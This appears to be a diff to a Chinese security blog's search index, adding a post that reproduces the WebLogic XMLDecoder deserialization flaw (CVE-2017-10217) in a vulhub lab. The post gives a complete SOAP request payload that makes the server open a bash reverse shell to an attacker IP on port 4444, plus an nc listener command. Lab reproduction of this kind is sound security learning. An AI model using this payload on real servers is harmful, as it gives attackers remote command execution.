@@ -4,6 +4,41 @@
   
     
     <entry>
+      <title>WebLogic XMLDecoder反序列化漏洞(CVE-2017-10217)</title>
+      <link href="/2022/05/15/WebLogic-wls-xml/"/>
+      <url>/2022/05/15/WebLogic-wls-xml/</url>
+      
+        <content type="html"><![CDATA[<h1 id="Weblogic-反序列化漏洞-CVE-2017-10217"><a href="#Weblogic-反序列化漏洞-CVE-2017-10217" class="headerlink" title="Weblogic 反序列化漏洞(CVE-2017-10217)"></a>Weblogic 反序列化漏洞(CVE-2017-10217)</h1><h2 id="漏洞简述"><a href="#漏洞简述" class="headerlink" title="漏洞简述"></a>漏洞简述</h2><blockquote><p>Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。</p></blockquote><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><blockquote><p>10.3.6.0, 12.1.3.0, 12.2.1.0, 12.2.1.1 , 12.2.1.2</p></blockquote><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><pre class=" language-Linux"><code class="language-Linux">cd vulhub/weblogic/CVE-2017-10217docker-compose up -d</code></pre><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>首先打开<code>http://192.168.3.151:7001</code></p><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515164257738.png" alt="image-20220515164257738"></p><p>出现这个说明环境搭建没问题</p><p>触发漏洞的url是<code>/wls-wsat/CoordinatorPortType</code>,访问一下看看</p><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515164408924.png" alt="image-20220515164408924"></p><p>打开<code>burpsuite</code>，抓取这里的数据包，修改数据包</p><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515165016888.png" alt="image-20220515165016888"></p><p>修改数据包</p><pre class=" language-bash"><code class="language-bash">POST /wls-wsat/CoordinatorPortType HTTP/1.1Host: 192.168.3.151:7001User-Agent: Mozilla/5.0 <span class="token punctuation">(</span>Windows NT 6.1<span class="token punctuation">;</span> WOW64<span class="token punctuation">;</span> rv:52.0<span class="token punctuation">)</span> Gecko/20100101 Firefox/52.0Accept: text/html,application/xhtml+xml,application/xml<span class="token punctuation">;</span>q<span class="token operator">=</span>0.9,*/*<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8Accept-Language: zh-CN,zh<span class="token punctuation">;</span>q<span class="token operator">=</span>0.8,en-US<span class="token punctuation">;</span>q<span class="token operator">=</span>0.5,en<span class="token punctuation">;</span>q<span class="token operator">=</span>0.3DNT: 1Content-Type: text/xmlConnection: closeUpgrade-Insecure-Requests: 1Content-Length: 638<span class="token operator">&lt;</span>soapenv:Envelope xmlns:soapenv<span class="token operator">=</span><span class="token string">"http://schemas.xmlsoap.org/soap/envelope/"</span><span class="token operator">></span> <span class="token operator">&lt;</span>soapenv:Header<span class="token operator">></span><span class="token operator">&lt;</span>work:WorkContext xmlns:work<span class="token operator">=</span><span class="token string">"http://bea.com/2004/06/soap/workarea/"</span><span class="token operator">></span><span class="token operator">&lt;</span>java version<span class="token operator">=</span><span class="token string">"1.4.0"</span> class<span class="token operator">=</span><span class="token string">"java.beans.XMLDecoder"</span><span class="token operator">></span><span class="token operator">&lt;</span>void class<span class="token operator">=</span><span class="token string">"java.lang.ProcessBuilder"</span><span class="token operator">></span><span class="token operator">&lt;</span>array class<span class="token operator">=</span><span class="token string">"java.lang.String"</span> length<span class="token operator">=</span><span class="token string">"3"</span><span class="token operator">></span><span class="token operator">&lt;</span>void index<span class="token operator">=</span><span class="token string">"0"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>/bin/bash<span class="token operator">&lt;</span>/string<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>void index<span class="token operator">=</span><span class="token string">"1"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>-c<span class="token operator">&lt;</span>/string<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>void index<span class="token operator">=</span><span class="token string">"2"</span><span class="token operator">></span><span class="token operator">&lt;</span>string<span class="token operator">></span>bash -i <span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span> /dev/tcp/192.168.3.134/4444 0<span class="token operator">&amp;</span>gt<span class="token punctuation">;</span><span class="token operator">&amp;</span>amp<span class="token punctuation">;</span>1<span class="token operator">&lt;</span>/string<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>/array<span class="token operator">></span><span class="token operator">&lt;</span>void method<span class="token operator">=</span><span class="token string">"start"</span>/<span class="token operator">></span><span class="token operator">&lt;</span>/void<span class="token operator">></span><span class="token operator">&lt;</span>/java<span class="token operator">></span><span class="token operator">&lt;</span>/work:WorkContext<span class="token operator">></span><span class="token operator">&lt;</span>/soapenv:Header<span class="token operator">></span><span class="token operator">&lt;</span>soapenv:Body/<span class="token operator">></span><span class="token operator">&lt;</span>/soapenv:Envelope<span class="token operator">></span><span class="token operator">&lt;</span>/soapenv:Envelope<span class="token operator">></span></code></pre><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515165754745.png" alt="image-20220515165754745"></p><p>然后用nc连接</p><pre class=" language-Linux"><code class="language-Linux">nc -lvvp 4444</code></pre><p><img src="/2022/05/15/WebLogic-wls-xml/image-20220515165822517.png" alt="image-20220515165822517"></p><p>ok!结束！</p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 漏洞复现 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 环境搭建 </tag>
+            
+            <tag> 漏洞复现 </tag>
+            
+            <tag> 网络安全 </tag>
+            
+            <tag> vulhub </tag>
+            
+            <tag> CVE </tag>
+            
+            <tag> Weblogic </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>Vulnstack红日内网渗透靶场1实战</title>
       <link href="/2022/05/13/Vulnstack-ATT-CK-1/"/>
       <url>/2022/05/13/Vulnstack-ATT-CK-1/</url>
